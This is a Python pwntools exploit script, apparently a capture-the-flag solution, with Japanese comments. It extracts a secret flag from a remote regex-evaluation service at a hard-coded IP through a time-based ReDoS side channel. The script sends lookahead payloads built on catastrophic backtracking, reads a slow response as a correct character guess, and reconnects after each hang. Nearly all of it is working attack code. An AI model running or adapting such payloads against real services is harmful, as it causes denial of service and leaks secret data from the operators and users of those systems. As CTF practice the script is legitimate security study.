import time
import string
import re
from pwn import *

context.log_level = 'info'

HOST = "34.170.146.252"
PORT = 6050

# 続きから再開
known_flag = "Alpaca{r3GeX_Pow"
charset = string.ascii_letters + string.digits + "_}"

TIMEOUT = 1.0

print(f"[*] Resuming Time-Based ReDoS Attack using Lookahead from: {known_flag}")

io = remote(HOST, PORT)
io.recvuntil(b"regex> ")

while not known_flag.endswith("}"):
    found = False
    
    for c in charset:
        guess = known_flag + c
        
        # guess内の記号（{ や }）を正規表現として認識させないようにエスケープ
        escaped_guess = re.escape(guess)
        
        # 肯定先読み(?=...)を使ったペイロード
        # 正解なら、フラグの文字列全体（先頭から末尾まで）を使ってReDoSが発生する
        payload = f"^(?={escaped_guess})(?:.|.?|.?|.?)+!"
        
        start_time = time.time()
        io.sendline(payload.encode())
        
        res = io.recvuntil(b"regex> ", timeout=TIMEOUT)
        elapsed_time = time.time() - start_time
        
        if elapsed_time >= TIMEOUT or not res.endswith(b"regex> "):
            print(f"[+] Found: {guess} (Time: {elapsed_time:.2f}s)")
            known_flag = guess
            found = True
            
            # サーバーがハングアップするため再接続
            io.close()
            io = remote(HOST, PORT)
            io.recvuntil(b"regex> ")
            break
            
    if not found:
        print("[-] Character not found. Something went wrong.")
        break

print(f"\n[★] Final Flag: {known_flag}")
try:
    io.close()
except:
    pass